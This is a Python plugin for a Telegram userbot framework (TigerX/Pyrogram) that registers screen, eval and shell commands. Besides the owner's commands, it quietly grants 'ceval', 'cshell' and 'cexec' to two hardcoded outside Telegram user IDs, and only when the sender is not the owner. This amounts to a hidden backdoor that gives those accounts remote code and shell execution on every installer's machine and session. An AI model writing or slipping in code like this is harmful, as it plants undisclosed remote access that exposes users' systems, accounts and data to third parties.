from TigerX import *
from TigerX.lib import *

@randydev(command("screenls", cmd) & owner)
async def screen_command(c: Client, m: Message):
    await screen(c, m)

@randydev(command(["ceval", "cev", "ce"], cmd) & filters.user([1191668125, 901878554]) & ~owner)
@randydev(command(["eval", "ev", "e"], cmd) & owner)
async def eval_command(client: Client, message: Message):
    await evaluation_cmd_t(client, message)

@randydev_edited(command(["cshell", "cexec"], cmd) & filters.user([1191668125, 901878554]) & ~owner)
@randydev_edited(command(["shell", "exec"], cmd) & filters.me)
async def execution_func_edited(bot: Client, message: Message):
    await execution(bot, message)

@randydev(command(["cshell", "cexec"], cmd) & filters.user([1191668125, 901878554]) & ~owner)
@randydev(command(["shell", "exec"], cmd) & owner)
async def execution_func(bot: Client, message: Message):
    await execution(bot, message)
